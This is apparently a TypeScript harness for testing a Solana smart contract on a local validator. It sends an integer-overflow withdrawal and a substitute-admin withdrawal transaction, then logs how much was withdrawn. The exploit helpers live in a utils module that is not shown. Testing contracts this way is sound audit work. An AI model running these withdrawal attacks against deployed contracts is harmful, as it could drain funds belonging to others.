import {
  Connection,
  PublicKey,
  Transaction,
  sendAndConfirmTransaction,
} from '@solana/web3.js';
import { attemptIntegerOverflowWithdraw, attemptSubstituteAdminWithdraw, checkProgram, establishConnection, establishPayer, getPayer, reportWithdrawn } from './utils';

// Define the Solana network connection
const connection = new Connection('http://127.0.0.1:8899');

// Function to test a smart contract for vulnerabilities
async function testSmartContract(contractAddress: string) {
  try {

    const programId = new PublicKey(contractAddress)

    // Fetch the smart contract's data
    const contractAccountInfo = await connection.getAccountInfo(programId);
    if (!contractAccountInfo) {
      throw new Error('Smart contract not found');
    }

    await establishConnection();

    await establishPayer();

    await checkProgram();

    const payer = await getPayer()

    // // Test 1: Integer overflow vulnerability
    const integerOverflowInstruction = await attemptIntegerOverflowWithdraw(256)
    const integerOverflowTransaction = new Transaction().add(
      integerOverflowInstruction
    );
    await sendAndConfirmTransaction(connection, integerOverflowTransaction, [payer]);

    // Test 2: Substitute Admin vulnerability
    const substituteAdminInstruction = await attemptSubstituteAdminWithdraw(256)
    const substituteAdminTransaction = new Transaction().add(
      substituteAdminInstruction
    );
    await sendAndConfirmTransaction(connection, substituteAdminTransaction, [payer]);

    const programResponse = await reportWithdrawn();
    
    // Display the test results
    console.log('\nSmart contract vulnerability test results:');
    console.log('---- New Account Balance: ', programResponse.balance);
    console.log('---- Amount Withdrawn: ', programResponse.amount_withdrawn);

  } catch (error) {
    console.error('\nError testing smart contract:', error);
  }
}

// Usage example: Test a specific Solana smart contract for vulnerabilities
const smartContractAddress = '6LMzC8qh8Tio4MjdEtDNpKa8VjWeVdz5seXBoiKm2CY6';
// for(var i = 0; i >=10; i++ ){
//   testSmartContract(smartContractAddress);
// }

testSmartContract(smartContractAddress);



